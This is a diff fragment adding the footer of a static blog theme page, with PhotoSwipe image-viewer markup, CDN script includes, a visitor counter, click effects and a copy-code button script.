+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
